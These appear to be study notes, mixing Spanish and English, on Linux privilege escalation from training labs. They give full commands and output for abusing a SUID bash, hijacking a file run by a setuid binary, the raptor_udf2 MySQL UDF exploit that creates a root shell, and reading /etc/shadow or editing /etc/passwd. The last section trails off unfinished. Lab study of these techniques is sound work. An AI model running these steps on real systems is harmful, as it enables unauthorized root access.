Escalación de privilegios Linux

--------------------------------------------------------------

Teoría Inicial - Permisos
r (Read) = Permiso de lectura
w (Write) = Permiso de escritura
x (Exectute) = Permiso de ejecución

Teoría Inicial - Clasificación de usuarios
U (User) = (e.g root, john, jack)
G (Group) = (e.g admin, teachers, docker)
O (Other) = (Otro tipo de usuario o grupo)

-rw-rw---- 1 teacher admin      12 Apr  6 22:27 guidelines
-r--r----- 1 student admin      10 Apr  6 22:27 readme.txt

MAS INFORMACIÓN: https://gist.github.com/juanarbol/c44e736be70279c1fd5d68aa24f9d8be
--------------------------------------------------------------

Permiso de archivo
En los archivos revisar que usuarios pueden leer basado en los permisos de grupos.
Comando: cat /etc/groups

Crear archivos executables con permisos del usuario loggeado
Comando: chmod +x shell

Revisar los archivos con permisos de lectura
Comando: find / -perm -o+r

Revisar los archivos con permisos de escritura
Comando: find / -perm -o+w

Buscar todos los binarios con setuid bit set (TIP ADICIONAL: Revisar https://gtfobins.github.io/ por cada binario)
Comando: find / -perm -4000

Ejemplo de escalación
1- Revisar los permisos de /bin/bash - Comando: ls -l /bin/bash
2- Establecer bit setuid - Comando: chmod u+s /bin/bash
3- Revisar que el setuid a sido establecido - Comando: ls -l /bin/bash
4- Cambiar el usuario con "su" - Comando: su student -> whoami (Revisar el id de usuario (student))
5- Escalar privilegios - Comando: bash -p

root@hannibal:/work# ls -l /bin/bash
-rwsr-xr-x 1 root root 1166912 May  3  2019 /bin/bash
root@attackdefense:/work# su student
$ id
uid=999(student) gid=999(student) groups=999(student)
$ whoami
student
$ bash -p
bash-5.0# id
uid=999(student) gid=999(student) euid=0(root) groups=999(student)
bash-5.0# whoami
root

--------------------------------------------------------------
Explotaciòn de programas setuid

1-. Revisar los permisos de los archivos (Comando: ls -la / Comando: file)
2-. Revisar los carateres legibles de los archivos (Comando: strings)
3-. Borrar los archivos que ejecuta el programa con sutuid
4-. Ejecutar el binario vulnerable

student@attackdefense:~$ ls -la
-r-x------ 1 root    root    8296 Sep 22  2018 greetings
-rwsr-xr-x 1 root    root    8344 Sep 22  2018 welcome (Binario vulnerable)
student@attackdefense:~$ strings welcome | head -n 20
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
system
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
AWAVI
AUATL
[]A\A]A^A_
greetings (Ejecuta el archivo que se encontro en la carpeta)
;*3$"
GCC: (Ubuntu 7.3.0-16ubuntu3) 7.3.0
student@attackdefense:~$ rm -Rf greetings (Borramos el archivo que ya ejecuto el binario vulnerable)
student@attackdefense:~$ cp /bin/bash greetings (Copiamos el binario bash al archivo greetings)
student@attackdefense:~$ ./welcome
root@attackdefense:~# id
uid=0(root) gid=999(student) groups=999(student)

--------------------------------------------------------------

The MySQL service is running as root and the "root" user for the service does not have a password assigned. We can use a popular exploit that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.

Change into the /home/user/tools/mysql-udf directory:

cd /home/user/tools/mysql-udf

Compile the raptor_udf2.c exploit code using the following commands:

gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

Connect to the MySQL service as the root user with a blank password:

mysql -u root

Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do_system" using our compiled exploit:

use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';

Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:

select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');

Exit out of the MySQL shell (type exit or \q and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

/tmp/rootbash -p

Success!

--------------------------------------------------------------

Revisar los permisos en archivos potencialmente maliciosos

1- Revisar que si cuenta con permisos de lectura el archivo /etc/shadow -> Obtenemos el hash del password y lo crackeamos con john

1- (Solo algunas versiones de Linux lo permiten) - Revisar si podemos ingresar la hash del password despues del nombre de usuario en el archivo /etc/passwd
    -openssl passwd passcreada
    -abrir /etc/passwd y poner el hash
    -su usuario 
  Tambien se puede crear un usuario solo copiando las caracteristicas del usuario en una nueva linea del archivo /etc/passwd
  
1-  
  
  
  
  --------------------------------------------------------------
  
